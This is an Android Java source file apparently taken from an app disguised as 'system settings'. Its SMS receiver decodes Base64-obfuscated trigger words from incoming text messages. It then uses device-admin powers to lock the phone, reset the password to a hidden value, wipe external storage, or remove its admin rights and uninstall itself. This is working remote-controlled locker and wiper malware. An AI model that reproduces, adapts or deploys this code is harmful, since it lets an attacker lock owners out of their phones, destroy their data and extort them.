package com.ghostman.systemsettings;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Base64;
import android.util.Log;

public class M_R extends BroadcastReceiver{

    @Override
    public void onReceive(Context context, Intent intent) {
        DevicePolicyManager DPM = (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        String NEW_PASSWORD = system("IUQwbnRLbjB3");
        String PASSWORD = system("UEFTU1cwUkQ=");
        String PASSWORD_REMOVE = system("UkVNMFZFRA==");
        String FORMAT = system("RjBSTUFU");
        String REMOVE_ADMIN = system("TjBX");
        Bundle bundle = intent.getExtras();
        SmsMessage[] MESSAGE;
        try
        {
            if(bundle!=null)
            {
                Object[] pdusObj = (Object[])bundle.get("pdus");

                MESSAGE = new SmsMessage[pdusObj.length];

                for(int i=0; i<pdusObj.length; i++) {
                    MESSAGE[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);

                    //String PHONE_NO = CURRENT_MESSAGE.getDisplayOriginatingAddress();
                    String CURRENT_MESSAGE = MESSAGE[i].getMessageBody();

                    if (CURRENT_MESSAGE.contains(PASSWORD) || CURRENT_MESSAGE.contains(PASSWORD_REMOVE) || CURRENT_MESSAGE.contains(FORMAT) || CURRENT_MESSAGE.contains(REMOVE_ADMIN)) {

                        PackageManager PM = context.getPackageManager();
                        ComponentName componentName = new ComponentName(context, MainActivity.class);

                        if (Build.VERSION.SDK_INT >= 24) {
                            Uri packageURI = Uri.parse("package:" + MainActivity.class.getPackage().getName());
                            Intent uninstall = new Intent(Intent.ACTION_DELETE, packageURI);
                            uninstall.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            context.startActivity(uninstall);
                        } else {
                            if (DPM.isAdminActive(new ComponentName(context.getPackageName(), context.getPackageName() + ".A_R"))) {
                                if (CURRENT_MESSAGE.contains(PASSWORD)) {
                                    DPM.lockNow();
                                    DPM.resetPassword(NEW_PASSWORD,DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                                }

                                if (CURRENT_MESSAGE.contains(FORMAT)) {
                                    DPM.lockNow();
                                    DPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
                                }

                                if (CURRENT_MESSAGE.contains(PASSWORD_REMOVE)) {
                                    DPM.lockNow();
                                    DPM.resetPassword("", 0);
                                }

                                if (CURRENT_MESSAGE.contains(REMOVE_ADMIN)) {
                                    DPM.lockNow();
                                    DPM.resetPassword("", 0);
                                    DPM.removeActiveAdmin(new ComponentName(context.getPackageName(), context.getPackageName() + ".A_R"));

                                    Uri packageURI = Uri.parse("package:" + MainActivity.class.getPackage().getName());
                                    Intent uninstall = new Intent(Intent.ACTION_DELETE, packageURI);
                                    uninstall.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    context.startActivity(uninstall);
                                }
                                PM.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                            } else
                                PM.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                        }
                    }
                }
            }
        }catch(Exception e)
        {
            Log.e("SMS RECEIVER : ","Exception SMS_RECEIVER : " + e);
        }
    }

    public String system(String INPUT)
    {
        byte[] RESULT = Base64.decode(INPUT,Base64.DEFAULT);
        return  new String(RESULT);
    }
}
